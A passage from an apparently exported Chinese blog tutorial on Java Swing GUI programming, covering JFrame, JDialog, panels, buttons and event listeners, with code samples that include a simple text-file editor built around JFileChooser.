title=\"两种监听器\"></a>两种监听器</h5><table>\n<thead>\n<tr>\n<th></th>\n<th>事件</th>\n<th>事件源</th>\n<th>监听接口</th>\n<th>方法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>动作事件监听器</td>\n<td>ActionEvent</td>\n<td>JButton,JlistmJTextField等</td>\n<td>ActionListener</td>\n<td>addActionListener(),removeActionListener()</td>\n</tr>\n<tr>\n<td>焦点事件监听器</td>\n<td>FocusEvent</td>\n<td>Component及其派生</td>\n<td>FocusListener</td>\n<td>addFocusListener(),removeFocusListener()</td>\n</tr>\n</tbody></table>\n<p>使用步骤</p>\n<ol>\n<li>新建一个组件(如Button)</li>\n<li>将该组件添加到相应的面板(如JFrame)</li>\n<li>注册监听器以监听事件源产生的事件(如通过ActionListener来响应用户点击按钮)</li>\n<li>定义处理事件的方法(如在ActionListener中的actionPerformed中定义响应的方法)</li>\n</ol>\n<p><strong>一般用匿名内部类方式实现</strong></p>\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jla.addFocusListener(<span class=\"keyword\">new</span> FocusListener()&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">focusLost</span><span class=\"params\">(FocusEvent e)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//失去焦点的时候做的事情</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">focusGained</span><span class=\"params\">(FocusEvent e)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取焦点的时候做的事情</span></span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jb.addActionListener(<span class=\"keyword\">new</span> ActionListener()&#123;</span><br><span class=\"line\">\t<span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span></span>&#123;</span><br><span class=\"line\">     <span class=\"comment\">//单击鼠标时执行   </span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.event.ActionEvent;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLayout(<span class=\"keyword\">new</span> FlowLayout());<span class=\"comment\">//设置网格布局</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;test&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        JTextArea jTextArea=<span class=\"keyword\">new</span> JTextArea();</span><br><span class=\"line\">        jTextArea.setLineWrap(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        JButton jButton=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;希望你对你对人生也是这个态度&quot;</span>);</span><br><span class=\"line\">        jf.add(jTextArea);</span><br><span class=\"line\">        jf.add(jButton);</span><br><span class=\"line\">        jButton.addActionListener(<span class=\"keyword\">new</span> AbstractAction() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span> </span>&#123;</span><br><span class=\"line\">                jTextArea.append(<span class=\"string\">&quot;啊对对对&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211228141558056.png\" alt=\"image-20211228141558056\" style=\"zoom:67%;\" />\n\n<h5 id=\"综合实践\"><a href=\"#综合实践\" class=\"headerlink\" title=\"综合实践\"></a>综合实践</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.filechooser.FileNameExtensionFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.event.ActionEvent;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.event.ActionListener;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.BufferedReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.BufferedWriter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileWriter;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S9_2</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> String path;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">readText</span><span class=\"params\">(String path,Object obj)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        JTextArea jTextArea=(JTextArea) obj;</span><br><span class=\"line\">        FileReader fileReader=<span class=\"keyword\">new</span> FileReader(path);</span><br><span class=\"line\">        BufferedReader bufferedReader=<span class=\"keyword\">new</span> BufferedReader(fileReader);</span><br><span class=\"line\"></span><br><span class=\"line\">        String line;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>((line=bufferedReader.readLine())!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            jTextArea.append(line);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        bufferedReader.close();</span><br><span class=\"line\">        fileReader.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">saveText</span><span class=\"params\">(String path,Object obj)</span><span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        JTextArea jTextArea=(JTextArea) obj;</span><br><span class=\"line\">        BufferedWriter bufferedWriter=<span class=\"keyword\">new</span> BufferedWriter(<span class=\"keyword\">new</span> FileWriter(path));</span><br><span class=\"line\">        bufferedWriter.write(jTextArea.getText());</span><br><span class=\"line\">        bufferedWriter.flush();</span><br><span class=\"line\">        bufferedWriter.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jFrame=<span class=\"keyword\">new</span> JFrame(<span class=\"string\">&quot;S9_2&quot;</span>);</span><br><span class=\"line\">        jFrame.setLayout(<span class=\"keyword\">new</span> FlowLayout(FlowLayout.CENTER));</span><br><span class=\"line\">        jFrame.setBounds(<span class=\"number\">500</span>,<span class=\"number\">500</span>,<span class=\"number\">600</span>,<span class=\"number\">500</span>);</span><br><span class=\"line\">        JTextArea jTextArea=<span class=\"keyword\">new</span> JTextArea(<span class=\"number\">20</span>,<span class=\"number\">50</span>);</span><br><span class=\"line\">        JTextField jTextField=<span class=\"keyword\">new</span> JTextField(<span class=\"number\">35</span>);</span><br><span class=\"line\">        <span class=\"comment\">//把文本域放进jScrollPane让其拥有滚动条</span></span><br><span class=\"line\">        JScrollPane jScrollPane=<span class=\"keyword\">new</span> JScrollPane(jTextArea);</span><br><span class=\"line\">        JLabel jLabel=<span class=\"keyword\">new</span> JLabel(<span class=\"string\">&quot;File:&quot;</span>);</span><br><span class=\"line\">        JButton Browse=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;Browse&quot;</span>);</span><br><span class=\"line\">        Browse.addActionListener(<span class=\"keyword\">new</span> ActionListener() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span> </span>&#123;</span><br><span class=\"line\">                </span><br><span class=\"line\">             \t<span class=\"comment\">//文件选择组件</span></span><br><span class=\"line\">                JFileChooser chooser =<span class=\"keyword\">new</span> JFileChooser(<span class=\"string\">&quot;C:/&quot;</span>);</span><br><span class=\"line\">                FileNameExtensionFilter filter = <span class=\"keyword\">new</span> FileNameExtensionFilter(</span><br><span class=\"line\">                        <span class=\"string\">&quot;文本文档&quot;</span>, <span class=\"string\">&quot;txt&quot;</span>);</span><br><span class=\"line\">                chooser.setFileFilter(filter);</span><br><span class=\"line\">                <span class=\"keyword\">int</span> returnVal = chooser.showOpenDialog(jFrame);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(returnVal == JFileChooser.APPROVE_OPTION) &#123;</span><br><span class=\"line\">                    path=chooser.getSelectedFile().getAbsolutePath();</span><br><span class=\"line\">                    jTextField.setText(path);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        JButton Clear=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;Clear&quot;</span>);</span><br><span class=\"line\">        Clear.addActionListener(<span class=\"keyword\">new</span> ActionListener() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span> </span>&#123;</span><br><span class=\"line\">                jTextArea.setText(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        JButton Read=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;Read&quot;</span>);</span><br><span class=\"line\">        Read.addActionListener(<span class=\"keyword\">new</span> ActionListener() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                    readText(path,jTextArea);</span><br><span class=\"line\">                &#125;<span class=\"keyword\">catch</span> (Exception ex)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        JButton Save=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;Save&quot;</span>);</span><br><span class=\"line\">        Save.addActionListener(<span class=\"keyword\">new</span> ActionListener() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                    saveText(path,jTextArea);</span><br><span class=\"line\">                &#125;<span class=\"keyword\">catch</span> (Exception ex)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        JButton Exit=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;Exit&quot;</span>);</span><br><span class=\"line\">        Exit.addActionListener(<span class=\"keyword\">new</span> ActionListener() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">actionPerformed</span><span class=\"params\">(ActionEvent e)</span> </span>&#123;</span><br><span class=\"line\">                System.exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"comment\">//设置滚动条一直显示</span></span><br><span class=\"line\">        jScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);</span><br><span class=\"line\">        jFrame.add(jLabel);</span><br><span class=\"line\">        jFrame.add(jTextField);</span><br><span class=\"line\">        jFrame.add(Browse);</span><br><span class=\"line\">        jFrame.add(jScrollPane);</span><br><span class=\"line\">        jFrame.add(Clear);</span><br><span class=\"line\">        jFrame.add(Read);</span><br><span class=\"line\">        jFrame.add(Save);</span><br><span class=\"line\">        jFrame.add(Exit);</span><br><span class=\"line\">        jFrame.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211229002852293.png\" alt=\"image-20211229002852293\" style=\"zoom:67%;\" />\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"JFrame\"><a href=\"#JFrame\" class=\"headerlink\" title=\"JFrame\"></a>JFrame</h4><p>JFrame初体验</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setSize(<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLocation(<span class=\"number\">400</span>,<span class=\"number\">300</span>);<span class=\"comment\">//setLocation设置出现在屏幕中的位置</span></span><br><span class=\"line\">        <span class=\"comment\">//setBounds()可以一次性完成上面两句</span></span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);<span class=\"comment\">//设置窗口可见</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);<span class=\"comment\">//设置点击关闭后关闭</span></span><br><span class=\"line\">        <span class=\"comment\">/*关闭方式参数</span></span><br><span class=\"line\"><span class=\"comment\">        DO_NOTHING_ON_CLOSE//什么也不做</span></span><br><span class=\"line\"><span class=\"comment\">        HIDE_ON_CLOSE//隐藏当前窗口</span></span><br><span class=\"line\"><span class=\"comment\">        DISPOSE_ON_CLOSE//隐藏当前窗口,并释放窗体占有的其他资源</span></span><br><span class=\"line\"><span class=\"comment\">        EXIT_ON_CLOSE//结束窗口缩在的应用程序 ...一般选这个...</span></span><br><span class=\"line\"><span class=\"comment\">    &#125;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211227233144855.png\" alt=\"image-20211227233144855\" style=\"zoom: 67%;\" />\n\n<h4 id=\"JDialog\"><a href=\"#JDialog\" class=\"headerlink\" title=\"JDialog\"></a>JDialog</h4><p>继承自java.awt.Dialog类,他是从一个窗体弹出来的另外一个窗体,他和JFrame类似</p>\n<p><code>JDialog:可当成JFrame使用,但必须从属于JFrame</code></p>\n<p>构造函数 <strong>一般用第三种</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JDialog();</span><br><span class=\"line\">JDialog(Frame f);<span class=\"comment\">//指定父窗口</span></span><br><span class=\"line\">JDialog(Frame f,String title);<span class=\"comment\">//指定父窗口+标题</span></span><br></pre></td></tr></table></figure>\n\n<p>关闭方式只有三种,一般选第二种</p>\n<p>DO_NOTHING_ON_CLOSE//什么也不做<br>HIDE_ON_CLOSE//隐藏当前窗口<br>DISPOSE_ON_CLOSE//隐藏当前窗口,并释放窗体占有的其他资源</p>\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setSize(<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        <span class=\"comment\">//setLocation设置出现在屏幕中的位置</span></span><br><span class=\"line\">        jf.setLocation(<span class=\"number\">400</span>,<span class=\"number\">300</span>);</span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);<span class=\"comment\">//设置窗口可见</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\"></span><br><span class=\"line\">        JDialog jd=<span class=\"keyword\">new</span> JDialog(jf,<span class=\"string\">&quot;jdialog&quot;</span>);</span><br><span class=\"line\">        jd.setBounds(<span class=\"number\">500</span>,<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">300</span>);</span><br><span class=\"line\">        jd.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jd.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<img src=\"/images/java-ui/image-20211227234154224.png\" alt=\"image-20211227234154224\" style=\"zoom:67%;\" />\n\n<p>关闭JFrame所有窗口都会关闭,关闭JDialogJFrame不受影响</p>\n<h4 id=\"组件和面板\"><a href=\"#组件和面板\" class=\"headerlink\" title=\"组件和面板\"></a>组件和面板</h4><p>例子</p>\n<p>组件一般添加到Jpanel和JScrollPane再添加到JFrame</p>\n<p>JScrollPane是带滚动条的面板,只能添加一个组件,添加多个组件可以先添加到Jpanel再添加到JScrollPane</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);<span class=\"comment\">//设置窗口可见</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">        JButton jb1=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;btn1&quot;</span>);</span><br><span class=\"line\">        JButton jb2=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;btn2&quot;</span>);</span><br><span class=\"line\">        JPanel jp=<span class=\"keyword\">new</span> JPanel(<span class=\"keyword\">new</span> FlowLayout());</span><br><span class=\"line\">        jp.add(jb1);</span><br><span class=\"line\">        jp.add(jb2);</span><br><span class=\"line\">        jf.add(jp);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211227235300734.png\" alt=\"image-20211227235300734\" style=\"zoom:67%;\" />\n\n<h5 id=\"标签组件JLabel\"><a href=\"#标签组件JLabel\" class=\"headerlink\" title=\"标签组件JLabel\"></a>标签组件JLabel</h5><p>和C#中的label一样,类似于只读的文本框</p>\n<p>JLabel构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以下参数都可以省略</span><br><span class=\"line\">JLabel(String str,Icon icon,<span class=\"keyword\">int</span> aligment);<span class=\"comment\">//设置文本,图标,水平对齐方式</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"按钮组件JButton\"><a href=\"#按钮组件JButton\" class=\"headerlink\" title=\"按钮组件JButton\"></a>按钮组件JButton</h5><p>JButton构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以下参数都可以省略</span><br><span class=\"line\">JButton(String text,Icon icon)<span class=\"comment\">//设置文本,图标</span></span><br></pre></td></tr></table></figure>\n\n<p>其他JButton类内自带方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTooltipText(String text)<span class=\"comment\">//设置提示文本</span></span><br><span class=\"line\">setBorderPainted();<span class=\"comment\">//设置边界是否显示</span></span><br><span class=\"line\">setEnabled();<span class=\"comment\">//设置按钮知否可用</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"单选按钮组件JRadioButton\"><a href=\"#单选按钮组件JRadioButton\" class=\"headerlink\" 